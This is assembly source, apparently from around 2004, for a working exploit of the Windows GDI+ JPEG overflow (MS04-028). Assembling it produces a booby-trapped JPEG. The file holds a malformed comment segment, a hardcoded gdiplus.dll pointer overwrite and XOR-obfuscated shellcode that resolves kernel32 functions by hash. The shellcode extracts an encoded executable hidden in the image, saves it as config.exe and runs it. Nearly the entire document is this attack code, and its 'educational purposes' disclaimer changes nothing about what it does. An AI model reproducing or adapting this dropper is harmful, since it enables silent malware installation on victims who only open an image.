 macro	 comment{

  Windows JPEG GDI+ overflow (MS04-028) exploit.
  JPG extracts bound .exe to target's HDD and starts it.


Useage:
  Copmile this source to generate a jpeg file with bound executable.


  coded by S.T.A.S.
  mailto: s_t_a_s_@inbox.ru


DISCLAIMER:

  THIS SOFTWARE IS WRITTEN FOR EDUCATIONAL PURPOSES ONLY.
  THE AUTHOR HAS NO RESPONSIBILITY OF (IM)PROPER USE.


Thanks to:
  -perplexy-
  Elia Florio
  microsoft
  .....

}


; Original JPEG file
image_name	fix 'lucky.jpg'

; filename of exe to bind
source_exe	fix 'hello.exe'

; filename of exe to be saved to target disk
exe_filename	fix 'config.exe'


shellcode_xor_constant = 0x26
exe_xor_constant = 2166136261



format binary
use32

origin:



;Standard JPEG header
SOI:		db 0xFF,0xD8	;Start Of Image (these two identify a JPEG/JFIF file)


;JFIF APP0 segment marker
APP0:		db 0xFF,0xE0
.length:	dw (@f-$)/256+((@f-$)mod 256)*256	;(high byte, low byte), must be >= 16
.signature:	db 'JFIF',0	;identifies JFIF
.major_revision:db 1		;should be 1 (otherwise error)
.minor_revision:db 2		;should be 0..2 (otherwise try to decode anyway)
.units: 	db 0		;units for x/y densities (0 = no units)
.x_density:	db 0,0x50	;(high byte, low byte), should be <> 0
.y_density:	db 0,0x50	;(high byte, low byte), should be <> 0
.thumb_width:	db 0
.thumb_height:	db 0
@@:


;Comment
COM:		db 0xFF,0xFE
;hmm.. length value should be >=2, but we want 'undefined behavior'
;.length:       dw (@f-$)/256+((@f-$)mod 256)*256       ;(high byte, low byte)
.length:	db 0,1
@@:


db		'c00l'			;stuff dword
dw		0xEEEE
db		'6bytes'		;stuff 6 bytes


ecx_start:
		jmp byte code_start
		dw 0x7831

;Pointer address to overwrite


;dd              0                       ;for test purpose
;dd             0x70E7B1DC              ;70E7B1DC - gdiplus.dll version 5.1.3097.0
dd		 0x7830B1DC		;7830B1DC - gdiplus.dll version 5.1.3101.0



macro	ecall	fun
{
;       mov     eax,[ebp + _#fun]
;       call    eax
	call	dword[ebp + _#fun]
}

macro	import$ [fun]
{
	common	fun_number = 0
		local	char, hash
	forward local	here
		_#fun = (fun_number - number_of_funs) * 4
		virtual at 0
			db `fun,0
			hash = 0
			repeat $
				load char from % - 1
				hash = (hash shr 7) or ( 0xFFFFFFFF and (hash shl (32-7)) )
				hash = hash xor char
			end repeat
		end virtual
		store dword hash at base + fun_number * 4
		fun_number = fun_number + 1
	common	number_of_funs = fun_number
}


code_start:	;int3

	call	@f

base:	rd	number_of_funs
	db	0

@@:	pop	ebp

	mov	ecx,crypt_end - crypt_start

@@:	xor	byte[ebp+ecx+crypt_start-base-1],shellcode_xor_constant
	loop	@b

crypt_start:
	xor	esi,esi
	lods	dword[fs:esi]
@@:	xchg	eax,esi
	lods	dword[esi]
	or	eax,eax
	jns	@b
	lods	dword[esi]
@@:	dec	eax
	xor	ax,ax
	cmp	word[eax],'MZ'
	jnz	@b

;now eax = kernel image base

	xchg	eax,ebx

	mov	ecx,[ebx+0x3C]
	mov	ecx,[ebx+ecx+0x78]
	mov	edi,[ecx+ebx+0x0C]
	add	edi,ebx
	mov	esi,[ecx+ebx+0x1C]
	lea	esi,[esi+ebx-4]

fun_l:	xor	eax,eax
	cdq

	cmp	[ebp],al
	jz	import_Ok

@@:	ror	edx,7
	xor	dl,[edi]
	scas	byte[edi]
	jnz	@b

	lods	dword[esi]
	cmp	[ebp],edx
	jnz	fun_l

	add	eax,ebx
	mov	[ebp],eax
	add	ebp,4
	jmp	fun_l

import_Ok:
	xor	ebx,ebx

	push	ebx
	push	ebx
	push	3		;OPEN_EXISTING
	push	ebx
	push	1		;FILE_SHARE_READ
	push	0x80000000	;GENERIC_READ
	push	dword[esp+4*(15+6)]
;       call    @f
;       du      'funny.jpg',0

@@:	ecall	CreateFileW

	xchg	eax,esi

	mov	edi,exe_data - origin

@@:	push	ecx
	mov	ecx,esp

	push	ebx
	push	ecx
	push	1
	push	ebp
	push	esi
	ecall	ReadFile

	pop	ecx
	dec	edi
	jnz	@b


	push	ebx
	push	ebx
	push	2		;CREATE_ALWAYS
	push	ebx
	push	ebx
	push	0x40000000	;GENERIC_WRITE
	call	@f
_exe:	db	exe_filename,0
@@:	ecall	CreateFileA

	xchg	eax,edi

	mov	ebx,(exe_data_end - exe_data) / 4

@@:	push	ecx
	mov	ecx,esp

	push	0
	push	ecx
	push	4
	push	ebp
	push	esi
	ecall	ReadFile

	mov	ecx,exe_xor_constant
	movzx	eax,bl
	mul	ecx
	xor	eax,ecx
	xor	dword[ebp],eax


	mov	ecx,esp
	push	0
	push	ecx
	push	4
	push	ebp
	push	edi
	ecall	WriteFile

	pop	ecx

	dec	ebx
	jnz	@b

	push	esi
	ecall	CloseHandle

	push	edi
	ecall	CloseHandle

	or	ebx,17		;sizeof LPSTARTUPINFO
	push	ebx

@@:	and	dword[ebp+ebx*4],0
	dec	ebx
	jnz	@b
	pop	dword[ebp]

	push	ebp		;LPPROCESS_INFORMATION
	push	ebp		;LPSTARTUPINFO
	push	ebx		;lpCurrentDirectory
	push	ebx		;lpEnvironment
	push	ebx		;dwCreationFlags
	push	ebx		;bInheritHandles
	push	ebx		;lpThreadAttributes
	push	ebx		;lpProcessAttributes
	push	ebx		;lpCommandLine
	lea	eax,[_exe - (base + 4 * number_of_funs) + ebp]
	push	eax		;lpApplicationName
	ecall	CreateProcessA

	dec	ebx
	push	ebx		;INFINITE
	ecall	Sleep
crypt_end:
	import$ CloseHandle,CreateFileA,CreateFileW,CreateProcessA,ReadFile,Sleep,WriteFile


repeat	crypt_end - crypt_start
	load _byte from crypt_start + % - 1
	_byte = _byte xor shellcode_xor_constant
	store _byte at crypt_start + % - 1
end repeat


;JPEG body

virtual at 0
	file image_name
	image_data = 0
	repeat 5000
		load _WORD_ word from %
		if _WORD_ = 0xDBFF & image_data = 0
			image_data = %
		end if
	end repeat
end virtual

	file image_name:image_data


;EXE

exe_data:
	file	source_exe
exe_data_end:


repeat	(exe_data_end - exe_data) / 4
	load _dword dword from exe_data + (% - 1) * 4
	_xor = (( (exe_data_end - exe_data) / 4 - % + 1) and 0xFF) * exe_xor_constant
	_xor = _xor xor exe_xor_constant
	_dword = _dword xor _xor
	store dword (0xFFFFFFFF and _dword) at exe_data + (% - 1) * 4
end repeat


;:end